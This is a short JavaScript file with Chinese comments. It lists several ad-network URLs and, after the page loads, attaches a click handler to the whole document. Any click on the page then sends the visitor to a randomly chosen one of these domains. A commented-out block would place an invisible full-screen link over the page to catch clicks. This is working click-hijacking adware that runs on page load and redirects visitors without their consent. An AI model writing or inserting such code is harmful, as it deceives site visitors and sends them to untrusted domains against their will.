// 定义链接数组
var urls = [
  // hil: db
  "https://grim-package.com/bO3WV.0sPU3rp/vSbumMVaJkZVD/0U1/N/DDMG2sOOTWcm2zL-TSUR0mMhzbYS5oNYz/cJ",
  // "https://www.qrcreate.online",
  // hil: db123 
  "https://classic-bonus.com/bY3.VK0OPK3tpYv/bYmQVDJ-Z/DI0/1/MKzqcYy/MQzzATy/LMTSUGz/NNzTIrzDMXDgMm",
  // mon: db
  // "https://nutchaungong.com/4/7420689",
  // "https://maipheeg.com/4/7474716",
  // "https://glocheexi.com/4/7237941",
  "https://coawoaph.net/4/7237942",
  "https://laichegloavy.com/4/7631332",

  // "https://vorsoutseemt.com/4/7436813",
  // "https://eedootefaug.net/4/7420698",
  // "https://futseerdoa.com/4/7237921",
  // "https://eeboazurg.net/4/7420696",
  // "https://psauwaun.com/4/7614690",
  // "https://ptougeegnep.net/4/7237907",
];

// function createLink() {
//   if (urls.length === 0) {
//     return;
//   }
//   var a = document.createElement('a');
//   a.href = urls[Math.floor(Math.random() * urls.length)];
//   a.rel = 'noopener noreferrer';
//   a.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; opacity: 0;';
//   document.body.appendChild(a);
// }

function addClickLisener() {
  var didOpen = false;
  document.addEventListener("click", function() {
    if (didOpen) {
      return;
    }
    didOpen = true;
    setTimeout(() => {
      didOpen = false;
    }, 3000);
  
    var randomIndex = Math.floor(Math.random() * urls.length);
    var randomLink = urls[randomIndex];
    window.location.href = randomLink;
  });
}

function init() {
  setTimeout(() => {
    addClickLisener();
  }, 1000);
}

document.addEventListener('DOMContentLoaded', init);
